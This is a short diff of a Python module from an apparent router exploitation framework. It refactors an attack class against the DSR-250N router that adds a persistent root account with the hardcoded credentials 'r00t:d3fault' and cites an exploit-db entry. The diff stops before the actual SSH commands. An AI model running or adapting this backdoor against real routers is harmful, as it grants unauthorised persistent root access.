@@ -1,20 +1,21 @@
 import util
 from ..router_vuln import RouterVuln
 
-__router__ = 'DSR-250N'
-__vuln__='Add Admin'
-class AddAdmin(RouterVuln):
+class backdoor_250n(RouterVuln):
 	"""Add persistent root account.
 	   http://www.exploit-db.com/exploits/22930/
 	"""
 	def __init__(self):
-		super(AddAdmin,self).__init__()
+		self.router = 'DSR-250N'
+		self.vuln   = 'Add Admin'
+		super(backdoor_250n,self).__init__()
 
 	def run(self):
 		try:
 			import paramiko
 		except ImportError:
 			util.Error('Attack requires Paramiko library.')
+			return
 
 		util.Msg('Adding \'r00t:d3fault\'...')
 		try:
